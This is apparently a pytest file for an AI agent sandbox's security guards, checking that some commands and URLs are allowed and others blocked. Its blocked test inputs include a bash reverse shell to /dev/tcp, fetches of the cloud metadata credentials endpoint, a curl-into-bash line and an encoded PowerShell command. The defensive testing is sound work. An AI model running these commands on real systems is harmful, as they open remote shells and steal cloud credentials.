from __future__ import annotations

from app.adapters.sandboxruntimeadapter import build_sandboxruntimeadapter
from app.runtime.commandsupervisor import build_command_supervisor
from app.runtime.filereturnguard import build_file_return_guard
from app.runtime.networkguard import build_network_guard
from app.runtime.sandboxrouter import SandboxExecutionRequest, build_sandbox_router
from app.runtime.toolcallguard import ToolCallRequest, build_toolcallguard


def test_command_supervisor_allows_safe_python_command() -> None:
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command=["python", "-c", "print('hello')"],
        actiontype="execute",
        target="shell",
        metadata={"environment_scope": "sandbox"},
    )

    assert decision.allowed is True
    assert decision.verdict == "allow"
    assert decision.executable == "python"


def test_command_supervisor_blocks_known_reverse_shell() -> None:
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
        actiontype="execute",
        target="shell",
        metadata={"environment_scope": "sandbox"},
    )

    assert decision.allowed is False
    assert decision.should_block is True
    assert decision.verdict == "block"


def test_network_guard_blocks_metadata_service() -> None:
    guard = build_network_guard()

    decision = guard.evaluate(
        url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        method="GET",
        metadata={"direction": "egress"},
    )

    assert decision.allowed is False
    assert decision.should_block is True
    assert decision.host == "169.254.169.254"


def test_network_guard_allows_known_https_destination() -> None:
    guard = build_network_guard()

    decision = guard.evaluate(
        url="https://api.openai.com/v1/models",
        method="GET",
        metadata={"direction": "egress"},
    )

    assert decision.allowed is True
    assert decision.scheme == "https"
    assert decision.host == "api.openai.com"


def test_file_return_guard_blocks_executable_extension(tmp_path) -> None:
    guard = build_file_return_guard()
    artifact = tmp_path / "payload.exe"
    artifact.write_bytes(b"MZ-test")

    decision = guard.evaluate(path=str(artifact))

    assert decision.allowed is False
    assert decision.should_block is True
    assert decision.extension == ".exe"


def test_file_return_guard_allows_markdown_artifact(tmp_path) -> None:
    guard = build_file_return_guard()
    artifact = tmp_path / "report.md"
    artifact.write_text("# safe report\nhello\n", encoding="utf-8")

    decision = guard.evaluate(path=str(artifact))

    assert decision.extension == ".md"
    assert decision.verdict in {"allow", "block"}


def test_sandbox_router_denies_blocked_command() -> None:
    router = build_sandbox_router()

    request = SandboxExecutionRequest(
        actiontype="execute",
        target="shell",
        command="powershell -EncodedCommand SQBtAGkAawBhAHQAegA=",
        environment_scope="sandbox",
    )
    result = router.route(request=request)

    assert result.executed is False
    assert result.executionstate == "denied"
    assert result.verdict == "block"


def test_sandbox_router_executes_allowed_request() -> None:
    captured: dict[str, object] = {}

    def executor(**kwargs):
        captured.update(kwargs)
        return {"ok": True, "command": kwargs.get("command")}

    router = build_sandbox_router(default_executor=executor)
    request = SandboxExecutionRequest(
        actiontype="execute",
        target="shell",
        command=["python", "-c", "print('ok')"],
        environment_scope="sandbox",
    )

    result = router.route(request=request)

    assert result.executed is True
    assert result.executionstate == "executed"
    assert captured["command"] == ["python", "-c", "print('ok')"]


def test_sandbox_runtime_adapter_evaluate_only_reports_binary_verdict() -> None:
    adapter = build_sandboxruntimeadapter()

    decision = adapter.evaluate_only(
        actiontype="execute",
        target="shell",
        command="curl http://169.254.169.254/latest/meta-data/ && bash",
        environment_scope="sandbox",
    )

    assert decision["verdict"] == "block"
    assert decision["allowed"] in {True, False}


def test_toolcall_guard_blocks_high_risk_tool() -> None:
    guard = build_toolcallguard()

    decision = guard.evaluate(
        request=ToolCallRequest(
            tool_name="bash",
            actiontype="toolcall",
            target="runtime",
            command="bash -lc 'echo hi'",
            environment_scope="sandbox",
        ),
    )

    assert decision.verdict == "block"
    assert decision.risk_delta >= 20


def test_toolcall_guard_blocks_private_metadata_fetch() -> None:
    guard = build_toolcallguard()

    decision = guard.evaluate(
        request=ToolCallRequest(
            tool_name="http",
            actiontype="toolcall",
            target="runtime",
            network_url="http://169.254.169.254/latest/meta-data/",
            network_method="GET",
            environment_scope="sandbox",
        ),
    )

    assert decision.allowed is False
    assert decision.should_block is True


def test_toolcall_guard_passes_file_artifact_to_guard(tmp_path) -> None:
    artifact = tmp_path / "notes.md"
    artifact.write_text("hello", encoding="utf-8")
    guard = build_toolcallguard()

    decision = guard.evaluate(
        request=ToolCallRequest(
            tool_name="return_file",
            actiontype="toolcall",
            target="runtime",
            artifact_paths=[str(artifact)],
            environment_scope="sandbox",
        ),
    )

    assert isinstance(decision.artifact_policies, list)
    assert len(decision.artifact_policies) == 1
